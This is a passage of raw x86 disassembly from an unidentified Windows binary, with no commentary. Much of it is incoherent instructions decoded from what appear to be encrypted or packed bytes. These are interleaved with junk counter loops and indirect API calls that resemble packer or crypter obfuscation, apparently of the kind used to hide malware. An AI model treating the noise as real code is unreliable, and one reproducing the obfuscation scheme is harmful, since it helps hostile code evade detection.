  409cf9:	icebp  
  409cfa:	test   DWORD PTR [eax+ebp*4+0x37a8475c],ebp
  409d01:	imul   ebp,DWORD PTR ds:0xffeb9709,0x5ff1ecae
  409d0b:	inc    esp
  409d0c:	test   BYTE PTR [esi+0x3d855b6a],ch
  409d12:	out    dx,eax
  409d13:	push   ebp
  409d14:	leave  
  409d15:	mov    ecx,0x2eef05de
  409d1a:	adc    ebx,DWORD PTR [ecx+eax*8+0x4d]
  409d1e:	ds sti 
  409d20:	aas    
  409d21:	pop    ds
  409d22:	lods   al,BYTE PTR ds:[esi]
  409d23:	inc    eax
  409d24:	push   esp
  409d25:	leave  
  409d26:	hlt    
  409d27:	cld    
  409d28:	mov    dl,0xe9
  409d2a:	stos   BYTE PTR es:[edi],al
  409d2b:	adc    eax,0x8b42025c
  409d30:	sbb    eax,0x24767531
  409d35:	ins    BYTE PTR es:[edi],dx
  409d36:	in     eax,0x61
  409d38:	dec    ebx
  409d39:	sub    al,0xf3
  409d3b:	(bad)  
  409d3d:	mov    ebx,DWORD PTR [eax]
  409d3f:	lds    eax,FWORD PTR [ebx]
  409d41:	inc    DWORD PTR [edx-0x73]
  409d44:	xor    al,0xf1
  409d46:	dec    eax
  409d47:	or     BYTE PTR [ebx-0x45013ea4],dh
  409d4d:	xor    dh,dh
  409d4f:	pop    ss
  409d50:	aam    0x30
  409d52:	inc    ebp
  409d53:	daa    
  409d54:	test   esp,0xe2fa6664
  409d5a:	mov    ah,0x5b
  409d5c:	jne    0x409d0e
  409d5e:	add    eax,0x34f0a5f
  409d63:	sbb    BYTE PTR [edx],cl
  409d65:	rol    BYTE PTR [edi+0x4c],1
  409d68:	int    0x4a
  409d6a:	cdq    
  409d6b:	fmul   DWORD PTR [ecx-0x18]
  409d6e:	push   edx
  409d6f:	lods   al,BYTE PTR ds:[esi]
  409d70:	test   al,0x88
  409d72:	mov    edx,0x19a9c1e9
  409d77:	repnz addr16 push edx
  409d7a:	or     al,0x3c
  409d7c:	imul   esi,DWORD PTR [esp+edi*4-0x367abb5b],0x361705c7
  409d87:	inc    ebx
  409d88:	add    bh,ah
  409d8a:	xor    al,0x0
  409d8c:	add    BYTE PTR [edi],cl
  409d8e:	test   BYTE PTR [eax+eax*1],dl
  409d91:	add    BYTE PTR [eax],al
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43360b
  409d9c:	sub    DWORD PTR ds:0x4336df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433653,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	add    al,0x78
  409dc0:	mov    dl,0x80
  409dc2:	cmp    dl,ah
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	xchg   ebx,eax
  409dcb:	outs   dx,BYTE PTR ds:[esi]
  409dcc:	pop    edi
  409dcd:	fdivr  st(6),st
  409dcf:	xor    bl,BYTE PTR [ebx+0x7a]
  409dd2:	nop
  409dd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dd4:	xchg   ecx,eax
  409dd5:	ins    DWORD PTR es:[edi],dx
  409dd6:	sub    BYTE PTR [ebx],cl
  409dd8:	int    0x73
  409dda:	jne    0x409de3
  409ddc:	scas   eax,DWORD PTR es:[edi]
  409ddd:	dec    eax
  409dde:	hlt    
  409ddf:	aam    0xa1
  409de1:	add    esp,DWORD PTR [eax]
  409de3:	(bad)  
  409de4:	leave  
  409de5:	push   0x3c
  409de7:	out    0xc7,al
  409de9:	loope  0x409d82
  409deb:	and    eax,0xc0803184
  409df0:	ja     0x409de5
  409df2:	aad    0x8
  409df4:	sub    DWORD PTR ds:0x16dac8c0,0xc16cc7b0
  409dfe:	or     al,0x7c
  409e00:	push   0x54
  409e02:	(bad)  
  409e03:	jo     0x409e08
  409e05:	popa   
  409e06:	pusha  
  409e07:	sbb    DWORD PTR [ebp+0x4e],esp
  409e0a:	pusha  
  409e0b:	pop    esi
  409e0c:	inc    eax
  409e0d:	mov    ebx,0xb0c91a38
  409e12:	xor    eax,0x288898a6
  409e17:	dec    edi
  409e18:	sbb    eax,DWORD PTR [esi]
  409e1a:	push   edx
  409e1b:	loop   0x409e16
  409e1d:	sahf   
  409e1e:	les    esp,FWORD PTR [esi]
  409e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e21:	mov    al,0x99
  409e23:	mov    WORD PTR [ecx-0x7872e227],es
  409e29:	and    bh,BYTE PTR [esi-0x1fc27ab5]
  409e2f:	call   0x3686396a
  409e34:	shr    DWORD PTR [ecx+0x5aff7275],0x44
  409e3b:	inc    ebx
  409e3c:	fist   WORD PTR [eax-0xd]
  409e3f:	adc    eax,0xd7070db2
  409e44:	xchg   BYTE PTR [ebx+esi*1],dh
  409e47:	test   eax,0xe76caff9
  409e4c:	add    cl,BYTE PTR [eax-0x2a]
  409e4f:	clc    
  409e50:	jbe    0x409ebb
  409e52:	imul   edx,DWORD PTR [ecx],0x68
  409e55:	ss or  al,0x6c
  409e58:	ja     0x409e76
  409e5a:	or     al,0x93
  409e5c:	shr    BYTE PTR [eax-0x37],0xe6
  409e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e61:	or     dh,BYTE PTR [esi]
  409e63:	mov    ds:0x60376e2e,al
  409e68:	aad    0x15
  409e6a:	jmp    0x8ac1b8a7
  409e6f:	inc    edx
  409e70:	cs cmp al,0x29
  409e73:	mov    ebp,0xdacc42f
  409e78:	aad    0x95
  409e7a:	pop    ecx
  409e7b:	mov    ecx,0xfe169b9c
  409e80:	stos   BYTE PTR es:[edi],al
  409e81:	in     eax,0xec
  409e83:	stc    
  409e84:	ins    BYTE PTR es:[edi],dx
  409e85:	cmc    
  409e86:	xchg   BYTE PTR [esi],bh
  409e88:	in     al,0x57
  409e8a:	jl     0x409e7d
  409e8c:	mov    al,ds:0x2e57c817
  409e91:	push   0x2
  409e93:	dec    ecx
  409e94:	fidiv  DWORD PTR ds:0x69e05bf2
  409e9a:	inc    esp
  409e9b:	(bad)  
  409e9c:	jp     0x409ecc
  409e9e:	jno    0x409e86
  409ea0:	packsswb mm7,QWORD PTR [ecx]
  409ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ea4:	pop    edi
  409ea5:	push   eax
  409ea6:	outs   dx,DWORD PTR ds:[esi]
  409ea7:	repnz xor ebp,edi
  409eaa:	inc    ebp
  409eab:	mov    esi,0x35d3fdd8
  409eb0:	inc    edx
  409eb1:	push   ds
  409eb2:	arpl   WORD PTR [ebx-0x4a260810],sp
  409eb8:	mov    bl,0xbf
  409eba:	hlt    
  409ebb:	ins    BYTE PTR es:[edi],dx
  409ebc:	aam    0xc0
  409ebe:	xor    eax,0x5beb7285
  409ec3:	pop    eax
  409ec4:	inc    esp
  409ec5:	xchg   edx,eax
  409ec6:	push   esi
  409ec7:	and    edi,DWORD PTR [ebx+ebx*2-0x39]
  409ecb:	mov    ch,0xbc
  409ecd:	xchg   dl,cl
  409ecf:	in     al,0x24
  409ed1:	xchg   al,dh
  409ed3:	adc    eax,0x9e160a58
  409ed8:	mov    DWORD PTR cs:[eax+edi*8],edx
  409edc:	mov    esp,0x6ae1814a
  409ee1:	sub    al,0xcd
  409ee3:	adc    eax,DWORD PTR [esp+eax*2]
  409ee6:	pop    ebp
  409ee7:	xchg   ebp,eax
  409ee8:	and    edi,ebx
  409eea:	push   ebp
  409eeb:	loopne 0x409e80
  409eed:	pop    ss
  409eee:	test   al,0x16
  409ef0:	and    al,0x9
  409ef2:	enter  0xad9d,0xc6
  409ef6:	imul   ecx,esi,0xeaa5859e
  409efc:	test   DWORD PTR fs:[esi+eax*2-0x75cb700a],0x3efc955b
  409f08:	(bad)  
  409f09:	shl    bh,1
  409f0b:	imul   edx,DWORD PTR [ecx+0x5e],0x8a349ea5
  409f12:	sub    DWORD PTR [esi+eiz*4+0x2dcfe4cb],edi
  409f19:	out    0x1c,eax
  409f1b:	or     BYTE PTR ss:0x2332cf2,bl
  409f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f23:	mov    ecx,0x93aa0eb3
  409f28:	aad    0x5e
  409f2a:	jge    0x409f37
  409f2c:	push   esi
  409f2d:	fcmovu st,st(7)
  409f2f:	jp     0x409f35
  409f31:	push   esp
  409f32:	repnz popf 
  409f34:	in     eax,0x91
  409f36:	es cmp edx,esp
  409f39:	or     bl,bl
  409f3b:	sbb    ch,0x46
  409f3e:	and    esp,0xffffffe1
  409f41:	mov    ebx,DWORD PTR [eax-0x7f]
  409f44:	add    edx,DWORD PTR [ecx+eax*4+0x3b074a70]
  409f4b:	inc    eax
  409f4c:	ret    0x5ddb
  409f4f:	lea    edi,[esi+0x34]
  409f52:	lahf   
  409f53:	sub    BYTE PTR [ecx+0x2e],0x50
  409f57:	mov    edx,0xf524931
  409f5c:	repz add ebx,0xffffff8a
  409f60:	sub    ebx,esi
  409f62:	jne    0x409fc0
  409f64:	inc    esp
  409f65:	sahf   
  409f66:	retf   
  409f67:	adc    eax,0x6c4b67fb
  409f6c:	inc    ebp
  409f6d:	xchg   ebx,eax
  409f6e:	mov    fs,WORD PTR [esi-0x29]
  409f71:	jge    0x409eff
  409f73:	out    0xc,al
  409f75:	jne    0x409fa7
  409f77:	adc    ah,BYTE PTR [ecx+0x5a]
  409f7a:	out    dx,al
  409f7b:	xor    eax,0xf7906402
  409f80:	jmp    0x6736:0x34cbf40c
  409f87:	adc    al,BYTE PTR es:[esi-0x79f14f73]
  409f8e:	xchg   ebx,eax
  409f8f:	cmp    BYTE PTR [edx-0x77],al
  409f92:	fwait
  409f93:	pushf  
  409f94:	inc    esp
  409f95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f96:	scas   eax,DWORD PTR es:[edi]
  409f97:	pop    esi
  409f98:	in     al,dx
  409f99:	or     DWORD PTR [ecx],edx
  409f9b:	lahf   
  409f9c:	call   0x3fd65443
  409fa1:	das    
  409fa2:	lds    ebx,FWORD PTR [edx]
  409fa4:	std    
  409fa5:	sbb    bl,dl
  409fa7:	add    DWORD PTR gs:[edi],0xe90a2f62
  409fae:	retf   
  409faf:	mov    BYTE PTR [ecx],cl
  409fb1:	cld    
  409fb2:	cs lahf 
  409fb4:	test   BYTE PTR [eax+ebx*8],ch
  409fb7:	mov    dl,BYTE PTR [edi-0x286f9667]
  409fbd:	jge    0x40a00d
  409fbf:	outs   dx,DWORD PTR ds:[esi]
  409fc0:	cld    
  409fc1:	test   bl,dl
  409fc3:	mov    al,0xad
  409fc5:	pop    eax
  409fc6:	mov    edi,0x2108eb62
  409fcb:	ins    DWORD PTR es:[edi],dx
  409fcc:	in     al,0x35
  409fce:	mov    dl,0xa7
  409fd0:	add    edx,0xffffff8d
  409fd3:	test   BYTE PTR [esi+eiz*1-0x33],dh
  409fd7:	xlat   BYTE PTR ds:[ebx]
  409fd8:	inc    esp
  409fd9:	(bad)  [eax+ebp*8-0x52967f67]
  409fe0:	xchg   ebx,eax
  409fe1:	mov    ebp,0x1d3774f7
  409fe6:	cwde   
  409fe7:	pop    edi
  409fe8:	add    esi,DWORD PTR [esi]
  409fea:	call   0x68c401de
  409fef:	mov    esi,0xaf37613b
  409ff4:	test   DWORD PTR [ebx-0xa],esp
  409ff7:	sub    BYTE PTR [eax-0x4e115849],dl
  409ffd:	iret   
  409ffe:	enter  0xf099,0x64
  40a002:	std    
  40a003:	(bad)  
  40a004:	cld    
  40a005:	lahf   
  40a006:	mov    eax,0x252a83db
  40a00b:	lahf   
  40a00c:	hlt    
  40a00d:	mov    es,WORD PTR [ebx-0x3a]
  40a010:	imul   edx,eax
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x4336d3
  40a01e:	sbb    DWORD PTR ds:0x43360f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433663,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433623
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43365b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43365b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43365b,ecx
  40a059:	cmp    DWORD PTR ds:0x43365b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43383e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43365b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43360b,0x11
  40a090:	cmp    DWORD PTR ds:0x43360b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43360b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43360b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43360b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43360b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43360b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43360b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433603,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43366f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433613
  40a0ff:	mov    DWORD PTR ds:0x43366f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433667,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	lds    ebx,FWORD PTR [ebp-0x7a]
  40a129:	mov    edx,0x7e7ee082
  40a12e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a132:	fdivr  QWORD PTR [ecx]
  40a134:	xor    dh,ch
  40a136:	xor    DWORD PTR [esi+ecx*4-0x6476c464],edi
  40a13d:	and    eax,0x5ebdf60f
  40a142:	push   edx
  40a143:	pop    ds
  40a144:	fsub   DWORD PTR [edi-0x3b]
  40a147:	test   BYTE PTR [ebx+edi*8+0x43],ch
  40a14b:	push   cs
  40a14c:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a14e:	repnz rcr DWORD PTR [edi+0x60b0bfd0],cl
  40a155:	and    DWORD PTR [bp+si-0x68aa],eax
  40a15a:	xchg   edi,eax
  40a15b:	mov    DWORD PTR [edx+0x1b17fd0e],0x8ff07323
  40a165:	dec    ecx
  40a166:	jg     0x40a151
  40a168:	(bad)  
  40a169:	jmp    0xd6252526
  40a16e:	mov    es,WORD PTR es:[esi]
  40a171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a172:	ret    0x34b7
  40a175:	shr    BYTE PTR [esp+ecx*2],1
  40a178:	or     ah,al
  40a17a:	imul   edi,DWORD PTR [bx+di+0x52c],0x31e99f4
  40a183:	cmp    edi,DWORD PTR [eax+0x35]
  40a186:	int    0x82
  40a188:	nop
  40a189:	(bad)  
  40a18a:	cwde   
  40a18b:	dec    esp
  40a18c:	int    0xae
  40a18e:	f2xm1  
  40a190:	in     al,dx
  40a191:	xchg   BYTE PTR [edx+0x32],ch
  40a194:	enter  0xf82,0x83
  40a198:	stc    
  40a199:	adc    DWORD PTR [esi+0x2a96bc2d],ebx
  40a19f:	xchg   ecx,eax
  40a1a0:	or     BYTE PTR [edx+ebp*4-0x49],cl
  40a1a4:	jge    0x40a20a
  40a1a6:	push   es
  40a1a7:	cld    
  40a1a8:	cwde   
  40a1a9:	nop
  40a1aa:	fidivr DWORD PTR [esp+ecx*4+0x5947526d]
  40a1b1:	jne    0x40a15e
  40a1b3:	or     ah,bh
  40a1b5:	pop    ebp
  40a1b6:	popa   
  40a1b7:	xchg   DWORD PTR ss:[ebp+0x78],ebx
  40a1bb:	into   
  40a1bc:	dec    edx
  40a1bd:	xchg   BYTE PTR [edi],bh
  40a1bf:	jle    0x40a23c
  40a1c1:	cwde   
  40a1c2:	js     0x40a185
  40a1c4:	adc    ebp,DWORD PTR [ebx]
  40a1c6:	mov    esi,0xfeeae9a5
  40a1cb:	call   0x44c056b5
  40a1d0:	into   
  40a1d1:	aad    0xdc
  40a1d3:	add    al,ch
  40a1d5:	outs   dx,BYTE PTR ds:[esi]
  40a1d6:	cmp    al,0xa0
  40a1d8:	adc    BYTE PTR [eax],bh
  40a1da:	rcr    dh,cl
  40a1dc:	ins    BYTE PTR es:[edi],dx
  40a1dd:	add    BYTE PTR [ecx+0x5cb08471],0x9c
  40a1e4:	ret    0x43f3
  40a1e7:	addr16 out dx,al
  40a1e9:	or     BYTE PTR [eax],cl
  40a1eb:	out    0x62,al
  40a1ed:	pushf  
  40a1ee:	jno    0x40a17d
  40a1f0:	add    al,0xee
  40a1f2:	std    
  40a1f3:	fucomp st(2)
  40a1f5:	std    
  40a1f6:	fld    st(1)
  40a1f8:	mov    cl,0x4b
  40a1fa:	sub    bh,BYTE PTR [ecx+0x4e]
  40a1fd:	push   0xfacb6710
  40a202:	mov    edi,0x1dbcc439
  40a207:	es cmc 
  40a209:	iret   
  40a20a:	inc    edx
  40a20b:	pushf  
  40a20c:	bound  esi,QWORD PTR [edx]
  40a20e:	mov    BYTE PTR [ebp-0x7f],ah
  40a211:	jge    0x40a1a2
  40a213:	xor    eax,0x59f2b743
  40a218:	imul   ecx,eax,0xbf64e950
  40a21e:	cmp    eax,0xbd7c5a55
  40a223:	pop    ebx
  40a224:	add    eax,0x4ea979ee
  40a229:	lahf   
  40a22a:	pop    esi
  40a22b:	aam    0xa9
  40a22d:	or     al,0x21
  40a22f:	je     0x40a1d5
  40a231:	imul   ecx,DWORD PTR [edx+0x35],0xffffffc3
  40a235:	iret   
  40a236:	repnz repz mov al,ds:0x3215d9ad
  40a23d:	adc    eax,0xa956c968
  40a242:	dec    edx
  40a243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a244:	dec    edi
  40a245:	imul   ecx,DWORD PTR [esi-0x7b],0xffffffe2
  40a249:	call   DWORD PTR [edi]
  40a24b:	xlat   BYTE PTR ds:[ebx]
  40a24c:	inc    esi
  40a24d:	in     al,0x58
  40a24f:	pop    esp
  40a250:	fldenv [esi]
  40a252:	sub    bh,BYTE PTR [ebp+0x5cebe65a]
  40a258:	cs sub al,0xff
  40a25b:	in     al,0xd9
  40a25d:	sub    dl,dh
  40a25f:	jg     0x40a297
  40a261:	jmp    0xf63c:0x24b6b321
  40a268:	mov    ds:0xcdf389a8,al
  40a26d:	mov    es,WORD PTR [ebx]
  40a26f:	or     al,0x50
  40a271:	loopne 0x40a28f
  40a273:	jns    0x40a2d6
  40a275:	push   ebx
  40a276:	jnp    0x40a25a
  40a278:	jl     0x40a210
  40a27a:	retf   
  40a27b:	cli    
  40a27c:	mov    ds:0xd67e99db,al
  40a281:	ja     0x40a2f2
  40a283:	js     0x40a282
  40a285:	mov    ?,WORD PTR [ebp-0x4d1ff49d]
  40a28b:	jl     0x40a257
  40a28d:	xchg   ecx,eax
  40a28e:	or     DWORD PTR [ebx+0x26d80f26],ecx
  40a294:	inc    eax
  40a295:	ror    dl,0x29
  40a298:	jne    0x40a29a
  40a29a:	push   edx
  40a29b:	adc    al,0xe7
  40a29d:	retf   0xe428
  40a2a0:	cmp    BYTE PTR [eax],dl
  40a2a2:	mov    ds:0xcd40d047,eax
  40a2a7:	jecxz  0x40a2dc
  40a2a9:	push   es
  40a2aa:	inc    edx
  40a2ab:	es mov ebx,0x2f862e95
  40a2b1:	scas   eax,DWORD PTR es:[edi]
  40a2b2:	xor    eax,0xf278763c
  40a2b7:	call   0x42ed:0x8f3b104a
  40a2be:	mov    bl,0xb7
  40a2c0:	and    al,0x59
  40a2c2:	sub    DWORD PTR [esi+0x23],ebx
  40a2c5:	mov    esp,DWORD PTR [esi-0x5c]
  40a2c8:	js     0x40a2d6
  40a2ca:	cmp    eax,0x1b2537f1
  40a2cf:	pop    ecx
  40a2d0:	inc    ecx
  40a2d1:	fs jae 0x40a26c
  40a2d4:	mov    dh,0x9a
  40a2d6:	pop    es
  40a2d7:	out    dx,eax
  40a2d8:	fwait
  40a2d9:	les    esi,FWORD PTR [ebp+edx*8-0x5f540a92]
  40a2e0:	cwde   
  40a2e1:	aaa    
  40a2e2:	out    0x8b,al
  40a2e4:	retf   0x5f03
  40a2e7:	rol    BYTE PTR [edx],1
  40a2e9:	pop    edi
  40a2ea:	mov    ds:0xe587cea9,al
  40a2ef:	sbb    eax,DWORD PTR [eax+0x3a]
  40a2f2:	sar    edx,0x83
  40a2f5:	push   ebp
  40a2f6:	test   al,0x5f
  40a2f8:	aas    
  40a2f9:	jle    0x40a2fa
  40a2fb:	fild   QWORD PTR [esi-0x53]
  40a2fe:	cmp    bh,BYTE PTR [edi]
  40a300:	(bad)  
  40a301:	sbb    DWORD PTR fs:[esi-0x3ce493b3],ebx
  40a308:	fwait
  40a309:	cs aad 0x6b
  40a30c:	inc    ecx
  40a30d:	mov    ecx,DWORD PTR [ecx-0x29540c3]
  40a313:	popa   
  40a314:	bound  ebp,QWORD PTR [ebx+0x6690bd29]
  40a31a:	fucomip st,st(7)
  40a31c:	sbb    al,0xe9
  40a31e:	cmp    al,0x79
  40a320:	cwde   
  40a321:	cmp    DWORD PTR [eax+0x392235f],ebp
  40a327:	adc    DWORD PTR [eax+0x3be96b19],ebp
  40a32d:	daa    
  40a32e:	push   0x8d459cf9
  40a333:	inc    esi
  40a334:	js     0x40a2e8
  40a336:	and    al,0xfe
  40a338:	add    edx,DWORD PTR [ecx+0x48cfed5d]
  40a33e:	daa    
  40a33f:	pop    eax
  40a340:	jmp    0xc11f:0x387e8f26
  40a347:	(bad)  
  40a348:	cwde   
  40a349:	shr    BYTE PTR [ebx+0xe],0x69
  40a34d:	leave  
  40a34e:	loop   0x40a2f6
  40a350:	lahf   
  40a351:	push   ss
  40a352:	lahf   
  40a353:	jmp    FWORD PTR [edx]
  40a355:	push   ecx
  40a356:	xor    ebp,DWORD PTR [ecx]
  40a358:	mov    esp,0x5c7c16fe
  40a35d:	push   ebp
  40a35e:	call   0xa4f76734
  40a363:	aaa    
  40a364:	ror    DWORD PTR [eax],0x4a
  40a367:	adc    dh,BYTE PTR [edx+0x305b1466]
  40a36d:	pop    ecx
  40a36e:	out    0x4e,eax
  40a370:	mov    edx,0x553762c8
  40a375:	loopne 0x40a3c5
  40a377:	fisttp DWORD PTR [ebx-0x37cc17b3]
  40a37d:	and    DWORD PTR ds:0x4335fb,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4335fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4335fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4335fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4335fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4336ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43366b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433667,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433667,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433667,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433697
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433667,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433667
  40a434:	dec    eax
  40a435:	mov    ds:0x433667,eax
  40a43a:	mov    eax,ds:0x433667
  40a43f:	dec    eax
  40a440:	mov    ds:0x433667,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43361f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43372f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433723,0x4336a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433607,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	mov    ecx,0x4ced25e1
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	aam    0x4
  40a4a9:	test   DWORD PTR [ecx-0x58],eax
  40a4ac:	rcl    al,0xd4
  40a4af:	icebp  
  40a4b0:	inc    esp
  40a4b1:	pop    ds
  40a4b2:	xchg   BYTE PTR cs:[eax-0x1c],al
  40a4b6:	mov    WORD PTR [edx+0x57],?
  40a4b9:	in     al,0x5d
  40a4bb:	rcl    DWORD PTR [ebp+0x68],cl
  40a4be:	inc    ebp
  40a4bf:	sub    edx,ecx
  40a4c1:	(bad)  
  40a4c2:	push   0x60
  40a4c4:	xor    BYTE PTR [ecx+0x6d467206],bl
  40a4ca:	cdq    
  40a4cb:	push   0xc28ca47b
  40a4d0:	jl     0x40a4c1
  40a4d2:	mov    esi,0xb3ab0dc3
  40a4d7:	sub    BYTE PTR [edi+0x60fcca3e],ch
  40a4dd:	clc    
  40a4de:	retf   
  40a4df:	stos   BYTE PTR es:[edi],al
  40a4e0:	and    ecx,ecx
  40a4e2:	dec    edi
  40a4e3:	add    BYTE PTR [esi+ebx*8+0x39],0x75
  40a4e8:	repnz sub DWORD PTR [edi],0xd8d5f480
  40a4ef:	pop    edi
  40a4f0:	jp     0x40a4f6
  40a4f2:	jno    0x40a519
  40a4f4:	pusha  
  40a4f5:	enter  0xbbb6,0x3f
  40a4f9:	mov    al,bl
  40a4fb:	mov    esi,DWORD PTR [ebx-0x71]
  40a4fe:	jne    0x40a54a
  40a500:	or     al,BYTE PTR [ebp-0x13]
  40a503:	pop    edx
  40a504:	cld    
  40a505:	xlat   BYTE PTR ds:[ebx]
  40a506:	fisubr WORD PTR [eax]
  40a508:	test   al,0xbc
  40a50a:	add    ecx,DWORD PTR [esp+edi*4-0x65]
  40a50e:	outs   dx,BYTE PTR ds:[esi]
  40a50f:	lods   eax,DWORD PTR ds:[esi]
  40a510:	fcmove st,st(2)
  40a512:	and    eax,0x8f0f052a
  40a517:	inc    esp
  40a518:	hlt    
  40a519:	aam    0xb3
  40a51b:	test   DWORD PTR [esi+0x19],eax
  40a51e:	inc    ebx
  40a51f:	xchg   edi,eax
  40a520:	lds    edi,FWORD PTR [ecx+0x3076e40c]
  40a526:	jb     0x40a53a
  40a528:	sub    dh,BYTE PTR [ecx-0x4ee35366]
  40a52e:	push   eax
  40a52f:	mov    ch,0xd4
  40a531:	adc    DWORD PTR [edx],edi
  40a533:	fs in  al,0x42
  40a536:	jae    0x40a4d5
  40a538:	inc    eax
  40a539:	cmp    DWORD PTR [ecx+0x20],esp
  40a53c:	dec    eax
  40a53d:	and    eax,0xede41c2
  40a542:	es out 0x64,eax
  40a545:	in     eax,0xf0
  40a547:	dec    ebx
  40a548:	ja     0x40a544
  40a54a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a54b:	ds add eax,0x36ef92c9
  40a551:	mov    eax,0x73908021
  40a556:	dec    eax
  40a557:	mov    al,ds:0x6041fb82
  40a55c:	pop    es
  40a55d:	xchg   ebx,eax
  40a55e:	mov    ebp,0xb216fe7d
  40a563:	mov    dl,0x5
  40a565:	shr    DWORD PTR [esi+0x586f1ed8],cl
  40a56b:	addr16 (bad) 
  40a56d:	mov    dh,0x27
  40a56f:	cld    
  40a570:	sbb    esi,edi
  40a572:	aas    
  40a573:	push   eax
  40a574:	iret   
  40a575:	pop    ebx
  40a576:	ret    
  40a577:	leave  
  40a578:	or     al,0xbd
  40a57a:	rcr    DWORD PTR [edx+esi*8],1
  40a57d:	mov    bl,0x87
  40a57f:	cmp    al,0xf1
  40a581:	cs dec ebp
